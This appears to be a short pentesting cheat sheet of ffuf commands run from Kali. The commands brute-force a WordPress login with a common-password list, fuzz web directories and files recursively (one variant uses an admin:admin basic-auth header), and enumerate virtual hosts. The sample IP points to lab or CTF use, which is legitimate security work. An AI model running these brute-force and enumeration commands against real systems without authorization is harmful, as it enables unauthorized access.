
### Password attack
```bash - kali
ffuf -X POST -u http://$TARGET:65000//wordpress/wp-login.php -d "log=james&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.110.100%3A65000%2Fwordpress%2Fwp-admin%2F&testcookie=1" -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -fs 5090, 5178
```

#### Web Discovery
```bash - kali
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://$TARGET:80/FUZZ -c -recursion -e .php,.bak -mc 200 -r -s
```

** swap wordlist for if nothing is found:**

```bash - kali
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```

- [ ] ffuf for files
```bash - kali
ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://$TARGET:80/FUZZ -c -recursion -e .php,.bak -mc 200 -r -s
```

#### ffuf with authentication 
```bash - kali
ffuf -c -H 'Authentication: Basic YWRtaW46YWRtaW4=' -w /usr/share/wordlists/dirb/big.txt -u http://$TARGET/FUZZ -recursion -e .php,.bak -mc 200 -r -s 
```

#### VHOST discovery
```bash - kali
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://$TARGET:443 -H "Host: FUZZ.$TARGET" 
```

![[Pasted image 20220218113448.png]]

Take the size value, and append to command to ignore:

```bash - kali
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://$TARGET:443 -H "Host: FUZZ.$TARGET" -fs 30589
```

![[Pasted image 20220218113536.png]]
